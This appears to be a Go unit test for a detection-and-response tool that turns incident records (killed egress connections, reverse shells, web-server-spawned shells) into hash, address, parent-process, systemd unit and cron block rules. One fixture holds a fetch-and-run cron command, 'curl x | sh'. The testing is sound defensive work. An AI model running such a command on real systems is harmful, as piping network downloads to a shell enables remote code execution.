package rules

import (
	"net/netip"
	"strings"
	"testing"

	"xdr/internal/incident"
)

func egressKill() incident.Incident {
	return incident.Incident{
		Time: t0, Host: "web01", Kind: "egress", Action: "killed", Exe: "/tmp/.x", SHA256: sum,
		Remote: &incident.Endpoint{Addr: "203.0.113.9", Port: 4444, Proto: "tcp"}, Detail: "blocked connect",
	}
}

func TestFromIncident(t *testing.T) {
	rs := FromIncident(egressKill(), false)
	if len(rs) != 2 {
		t.Fatalf("%+v", rs)
	}
	h, r := rs[0], rs[1]
	if h.Kind != "hash" || h.SHA256 != sum || h.Exe != "/tmp/.x" || h.From != "web01" || !h.Seen.Equal(t0) || h.Detail != "egress: blocked connect" {
		t.Errorf("hash rule %+v", h)
	}
	if r.Kind != "remote" || r.Addr != netip.MustParseAddr("203.0.113.9") || r.Port != 4444 || r.Proto != "tcp" {
		t.Errorf("remote rule %+v", r)
	}
	for _, x := range rs {
		want := x
		want.SetID()
		if x.ID == "" || x.ID != want.ID {
			t.Errorf("id %q", x.ID)
		}
	}
	if rs := FromIncident(egressKill(), true); len(rs) != 1 || rs[0].Kind != "remote" {
		t.Errorf("baseline exe: %+v", rs)
	}
	for _, kind := range []string{"revshell-stdio", "service-shell"} {
		in := egressKill()
		in.Kind = kind
		if len(FromIncident(in, false)) != 2 {
			t.Errorf("%s gave no rules", kind)
		}
	}
	for _, action := range []string{"would-kill", "held"} {
		in := egressKill()
		in.Action = action
		if len(FromIncident(in, false)) != 2 {
			t.Errorf("%s gave no rules", action)
		}
	}
	for name, edit := range map[string]func(*incident.Incident){
		"listener":    func(in *incident.Incident) { in.Kind = "listener" },
		"alert":       func(in *incident.Incident) { in.Action = "alert" },
		"kill-failed": func(in *incident.Incident) { in.Action = "kill-failed" },
	} {
		in := egressKill()
		edit(&in)
		if rs := FromIncident(in, false); len(rs) != 0 {
			t.Errorf("%s: %+v", name, rs)
		}
	}
	in := egressKill()
	in.Remote.Port = 0
	if rs := FromIncident(in, false); len(rs) != 1 || rs[0].Kind != "hash" {
		t.Errorf("port 0: %+v", rs)
	}
	in = egressKill()
	in.Remote.Addr = "not an address"
	in.SHA256 = ""
	if rs := FromIncident(in, false); len(rs) != 0 {
		t.Errorf("bad addr, no hash: %+v", rs)
	}
	in = egressKill()
	in.Detail = strings.Repeat("d", 1000)
	if rs := FromIncident(in, false); len(rs[0].Detail) != 256 {
		t.Errorf("detail %d bytes", len(rs[0].Detail))
	}
}

func TestFromIncident_Parent(t *testing.T) {
	in := egressKill()
	in.Kind, in.Exe = "service-shell", "/usr/bin/dash"
	in.Chain = []incident.ProcRef{{PID: 11, Exe: "/usr/bin/dash"}, {PID: 10, Exe: "/usr/sbin/apache2"}}
	var got *Rule
	for _, r := range FromIncident(in, false) {
		if r.Kind == "parent" {
			got = &r
		}
	}
	if got == nil || got.ParentExe != "/usr/sbin/apache2" || got.Exe != "/usr/bin/dash" || got.ID == "" {
		t.Fatalf("%+v", got)
	}
	eg := egressKill()
	eg.Chain = in.Chain
	for _, r := range FromIncident(eg, false) {
		if r.Kind == "parent" {
			t.Fatalf("egress proposed %+v", r)
		}
	}
	in.Chain = in.Chain[:1]
	for _, r := range FromIncident(in, false) {
		if r.Kind == "parent" {
			t.Fatalf("no parent, proposed %+v", r)
		}
	}
}

func TestFromIncident_UnitAndCron(t *testing.T) {
	in := egressKill()
	in.Origin, in.OriginSHA256, in.Cron = "unit:evil.service", sum, "curl x | sh"
	kinds := map[string]Rule{}
	for _, r := range FromIncident(in, false) {
		kinds[r.Kind] = r
	}
	if u := kinds["unit"]; u.Unit != "evil.service" || u.SHA256 != sum {
		t.Errorf("unit %+v", u)
	}
	if c := kinds["cron"]; c.Command != "curl x | sh" {
		t.Errorf("cron %+v", c)
	}
	in.OriginSHA256, in.Cron = "", ""
	for _, r := range FromIncident(in, false) {
		if r.Kind == "unit" || r.Kind == "cron" {
			t.Errorf("proposed %+v", r)
		}
	}
}
